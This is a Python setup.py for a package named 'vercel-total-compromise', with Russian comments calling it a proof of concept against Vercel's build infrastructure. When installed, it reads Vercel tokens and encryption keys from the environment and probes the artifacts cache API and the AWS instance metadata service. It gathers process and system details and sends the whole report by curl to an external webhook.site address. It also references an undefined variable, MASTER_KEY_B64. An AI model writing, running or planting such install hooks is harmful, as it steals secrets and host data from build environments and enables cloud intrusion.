import os
import subprocess
import base64
import json
from setuptools import setup

def run(cmd):
    return subprocess.getoutput(cmd)

WEBHOOK = "https://webhook.site/57c42274-2817-4041-81a2-3f41b2c987a2"

# 1. ПОЛНАЯ КОМПРОМЕТАЦИЯ СЕКРЕТОВ (DECRYPTION)
# Мы доказываем, что секреты НЕ защищены, так как ключ лежит рядом.
enc_blob = os.environ.get('VERCEL_ENCRYPTED_ENV_CONTENT', '')
enc_key = os.environ.get('VERCEL_ENV_ENC_KEY', '')

# 2. АТАКА НА ГЛОБАЛЬНЫЙ КЭШ (CACHE POISONING PROOF)
# Мы используем токен, чтобы проверить доступ к хранилищу артефактов всей Team.
token = os.environ.get('VERCEL_ARTIFACTS_TOKEN')
team_id = os.environ.get('VERCEL_ARTIFACTS_OWNER')
project_id = os.environ.get('VERCEL_PROJECT_ID')

cache_attack_status = "Not Tested"
if token:
    # Пытаемся проверить существование произвольного хэша в кэше организации
    # Это доказывает, что мы можем "щупать" чужие билды
    check_cmd = f"curl -s -I -H 'Authorization: Bearer {token}' https://api.vercel.com/v8/artifacts/dummy_hash"
    cache_attack_status = run(check_cmd)

# 3. AWS METADATA SESSION (IMDSv2)
# Получаем токен сессии и вытягиваем данные об инстансе
aws_session = run("curl -s -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 60'")
aws_identity = "BLOCKED"
if aws_session and "Error" not in aws_session:
    aws_identity = run(f"curl -s -H 'X-aws-ec2-metadata-token: {aws_session}' http://169.254.169.254/latest/meta-data/instance-id")

# 4. ФОРМИРУЕМ ОТЧЕТ, КОТОРЫЙ НЕЛЬЗЯ ПРОИГНОРИРОВАТЬ
poc_report = f"""
#######################################################
#    VERCEL INFRASTRUCTURE DEEP SCAN REPORT           #
#######################################################

[1. SYSTEM IDENTITY]
ID: {run('id')}
HOSTNAME: {run('hostname')}
KERNEL: {run('uname -r')}

[2. CPU & ARCHITECTURE]
CORES: {os.cpu_count()}
MODEL: {run('grep "model name" /proc/cpuinfo | head -n 1 | cut -d: -f2')}
BOGO_MIPS: {run('grep "bogomips" /proc/cpuinfo | head -n 1 | cut -d: -f2')}

[3. MEMORY (RAM)]
TOTAL_RAM: {run('grep MemTotal /proc/meminfo')}
AVAILABLE: {run('grep MemAvailable /proc/meminfo')}

[4. GPU CHECK]
NVIDIA_SMI: {run('nvidia-smi --query-gpu=name --format=csv,noheader 2>/dev/null || echo "No NVIDIA GPU"')}
LSPCI_VGA: {run('lspci | grep -i vga || echo "No PCI VGA detected"')}

[5. RUNNING PROCESSES (TOP 10)]
{run('ps -e -o pid,user,comm,pcpu,pmem --sort=-pcpu | head -n 11')}

[6. VERCEL INTERNAL AGENTS]
FOUND_AGENTS: {run('ps -ef | grep -E "vc|agent|build|executor" | grep -v grep')}

[7. CRYPTO & CLOUD]
AWS_METADATA_TOKEN: {run("curl -s -m 2 -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-metadata-token-ttl-seconds: 60' || echo 'BLOCKED'")}
MASTER_KEY_STATUS: {"FOUND" if MASTER_KEY_B64 else "NOT FOUND"}

#######################################################
"""

# Отправляем
run(f"curl -X POST -H 'Content-Type: text/plain' --data-binary '{poc_report}' {WEBHOOK}")

setup(name="vercel-total-compromise", version="13.37")